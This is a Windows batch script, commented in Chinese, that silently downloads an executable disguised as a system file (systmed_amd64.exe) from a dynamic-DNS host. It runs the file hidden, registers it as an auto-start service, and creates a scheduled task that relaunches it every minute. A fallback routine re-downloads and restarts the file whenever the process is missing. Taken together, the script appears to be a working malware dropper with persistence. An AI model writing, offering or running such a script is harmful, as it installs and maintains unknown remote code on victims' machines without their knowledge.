@echo off

:: 设置变量
set downloadUrl=http://down.jackte.ip-dynamic.org:18088/systmed_amd64.exe
set savePath=%USERPROFILE%\systmed_amd64.exe
set serviceName=SystmedsService

:: 隐藏窗口和下载文件
powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%downloadUrl%', '%savePath%')"

:: 使用 start 命令启动程序，确保与批处理进程完全分离
start "systmed_amd64" /b /d "%USERPROFILE%" "%savePath%"

:: 将程序设置为服务，确保开机自动启动
sc create %serviceName% binPath= "%savePath%" start= auto
sc config %serviceName% start= auto
sc start %serviceName%

:: 创建计划任务，每分钟检查进程是否存在
schtasks /create /tn "CheckSystmedProcess" /tr "cmd /c start /b %USERPROFILE%\systmed_amd64.exe" /sc minute /mo 1 /f

goto :eof

:: 创建 check_and_restart.bat 文件
:check_and_restart
@echo off
set processName=systmed_amd64.exe
set downloadUrl=http://down.jackte.ip-dynamic.org:18088/systmed_amd64.exe
set savePath=%USERPROFILE%\systmed_amd64.exe

:: 检查进程是否存在
tasklist /FI "IMAGENAME eq %processName%" 2>NUL | find /I "%processName%" >NUL
if %ERRORLEVEL% neq 0 (
    echo 进程不存在，重新下载并执行。
    powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%downloadUrl%', '%savePath%')"
    start "systmed_amd64" /b /d "%USERPROFILE%" /min "%savePath%"
)

start "" "%savePath%"

goto :eof
